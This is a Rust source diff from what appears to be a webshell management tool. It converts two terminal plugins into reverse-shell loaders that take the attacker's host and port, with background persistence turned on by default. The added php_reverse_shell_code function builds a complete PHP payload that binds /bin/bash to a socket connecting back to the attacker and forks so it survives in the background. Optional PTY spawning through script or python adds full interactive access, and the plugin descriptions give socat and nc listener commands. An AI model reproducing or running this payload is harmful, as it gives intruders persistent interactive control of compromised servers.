@@ -548,28 +548,40 @@ impl FeaturePlugin for SuperTerminalPlugin {
     fn manifest(&self) -> FeatureManifest {
         FeatureManifest {
             id: "super_terminal".into(),
-            name: "超级终端".into(),
-            version: "1.0.0".into(),
-            description: "批量执行多条命令（逐行，输出汇总）。".into(),
+            name: "交互式终端（linpty）".into(),
+            version: "2.0.0".into(),
+            description: "反弹带 PTY 的完全交互式 shell（script 分配伪终端，"
+                .to_string()
+                .trim_end_matches("。")
+                .to_string()
+                + "支持 su 用户切换 / vim / top）；本地请用 PTY 方式接收："
+                + "socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:'bash',pty,stderr,setsid,sigint,sane",
             category: "general".into(),
             languages: vec![],
             params: vec![
                 ParamSpec {
-                    name: "commands".into(),
-                    label: "命令（每行一条）".into(),
+                    name: "host".into(),
+                    label: "攻击机地址".into(),
                     param_type: "string".into(),
-                    default: Some(serde_json::json!("id\npwd")),
+                    default: Some(serde_json::json!("127.0.0.1")),
                     options: None,
                 },
                 ParamSpec {
-                    name: "cwd".into(),
-                    label: "工作目录（可选）".into(),
-                    param_type: "string".into(),
-                    default: Some(serde_json::json!("")),
+                    name: "port".into(),
+                    label: "攻击机监听端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(4444)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "background".into(),
+                    label: "后台驻留".into(),
+                    param_type: "bool".into(),
+                    default: Some(serde_json::json!(true)),
                     options: None,
                 },
             ],
-            kind: "feature".into(),
+            kind: "loader".into(),
         }
     }
 
@@ -583,16 +595,18 @@ impl FeaturePlugin for SuperTerminalPlugin {
     ) -> Result<serde_json::Value, ProtocolError> {
         match runtime {
             "php" => {
-                let commands = param_str(params, "commands", "id");
-                let cwd = param_str(params, "cwd", "");
-                let code = php_super_terminal_code(&commands, &cwd);
+                let host = param_str(params, "host", "127.0.0.1");
+                let port = param_int(params, "port", 4444).clamp(1, 65535);
+                // 交互式 PTY 反弹（linpty）：script 分配 PTY → su 可用
+                let background = param_bool(params, "background", true);
+                let code = php_reverse_shell_code(&host, port, "/bin/bash", true, background);
                 let output = protocol.run_code(session, "php", &code, settings)?;
                 serde_json::from_str(&output).map_err(|_| {
                     ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                 })
             }
             other => Err(ProtocolError::NotSupported(format!(
-                "超级终端暂不支持运行时 {other}"
+                "交互式终端暂不支持运行时 {other}"
             ))),
         }
     }
@@ -688,28 +702,46 @@ impl FeaturePlugin for RealCmdPlugin {
     fn manifest(&self) -> FeatureManifest {
         FeatureManifest {
             id: "real_cmd".into(),
-            name: "虚拟终端".into(),
-            version: "1.0.0".into(),
-            description: "单条命令执行（支持工作目录，输出 base64 安全编码）。".into(),
+            name: "虚拟终端（反弹 Shell）".into(),
+            version: "2.0.0".into(),
+            description: "反弹一个 /bin/bash 到攻击机（pcntl 可用时后台驻留）；"
+                .to_string()
+                .trim_end_matches("；")
+                .to_string()
+                + " 本地监听：nc -lvnp PORT 后执行",
             category: "general".into(),
             languages: vec![],
             params: vec![
                 ParamSpec {
-                    name: "command".into(),
-                    label: "命令".into(),
+                    name: "host".into(),
+                    label: "攻击机地址".into(),
                     param_type: "string".into(),
-                    default: Some(serde_json::json!("id")),
+                    default: Some(serde_json::json!("127.0.0.1")),
                     options: None,
                 },
                 ParamSpec {
-                    name: "cwd".into(),
-                    label: "工作目录（可选）".into(),
-                    param_type: "string".into(),
-                    default: Some(serde_json::json!("")),
+                    name: "port".into(),
+                    label: "攻击机监听端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(4444)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "shell".into(),
+                    label: "Shell".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("/bin/bash")),
+                    options: Some(vec!["/bin/bash".into(), "/bin/sh".into()]),
+                },
+                ParamSpec {
+                    name: "background".into(),
+                    label: "后台驻留".into(),
+                    param_type: "bool".into(),
+                    default: Some(serde_json::json!(true)),
                     options: None,
                 },
             ],
-            kind: "feature".into(),
+            kind: "loader".into(),
         }
     }
 
@@ -723,19 +755,70 @@ impl FeaturePlugin for RealCmdPlugin {
     ) -> Result<serde_json::Value, ProtocolError> {
         match runtime {
             "php" => {
-                let command = param_str(params, "command", "id");
-                let cwd = param_str(params, "cwd", "");
-                let code = php_real_cmd_code(&command, &cwd);
+                let host = param_str(params, "host", "127.0.0.1");
+                let port = param_int(params, "port", 4444).clamp(1, 65535);
+                let shell = param_str(params, "shell", "/bin/bash");
+                let background = param_bool(params, "background", true);
+                let code = php_reverse_shell_code(&host, port, &shell, false, background);
                 let output = protocol.run_code(session, "php", &code, settings)?;
                 serde_json::from_str(&output).map_err(|_| {
                     ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                 })
             }
             other => Err(ProtocolError::NotSupported(format!(
-                "虚拟终端暂不支持运行时 {other}"
+                "反弹 Shell 暂不支持运行时 {other}"
             ))),
         }
     }
+}
+
+/// 反弹 Shell PHP 载荷：fsockopen + proc_open 绑定 socket。
+/// `pty_mode` 为 true 时用 script 分配 PTY（支持 su 等交互，linpty）。
+fn php_reverse_shell_code(host: &str, port: u32, shell: &str, pty_mode: bool, background: bool) -> String {
+    let pty_shell = if pty_mode {
+        "script -qec \"/bin/bash\" /dev/null 2>/dev/null || python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")' 2>/dev/null || /bin/bash -i"
+    } else {
+        shell
+    };
+    format!(
+        r#"<?php
+set_time_limit(0);
+error_reporting(0);
+$host = {host};
+$port = {port};
+$cmd = '{cmd}';
+$pid = 0;
+if ({background} && function_exists('pcntl_fork')) {{
+    $pid = pcntl_fork();
+    if ($pid > 0) {{
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid,
+            'connect' => $host . ':' . $port, 'shell' => '{cmd}'));
+        exit;
+    }}
+    if (function_exists('posix_setsid')) @posix_setsid();
+}}
+$sock = @fsockopen($host, $port, $errno, $errstr, 15);
+if (!$sock) {{
+    echo json_encode(array('ok' => false, 'error' => 'connect failed: ' . $errstr));
+    exit;
+}}
+$descriptors = array(0 => $sock, 1 => $sock, 2 => $sock);
+$process = @proc_open($cmd, $descriptors, $pipes);
+if (!is_resource($process)) {{
+    fwrite($sock, 'proc_open failed' . chr(10));
+    fclose($sock);
+    echo json_encode(array('ok' => false, 'error' => 'proc_open failed'));
+    exit;
+}}
+@proc_close($process);
+if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground',
+    'connect' => $host . ':' . $port, 'shell' => '{cmd}'));
+"#,
+        host = serde_json::to_string(host).unwrap_or_else(|_| "\"127.0.0.1\"".to_string()),
+        port = port,
+        cmd = pty_shell.replace("\\", "\\\\").replace("'", "\\'"),
+        background = if background { "true" } else { "false" },
+    )
 }
 
 // ---------------------------------------------------------------------------
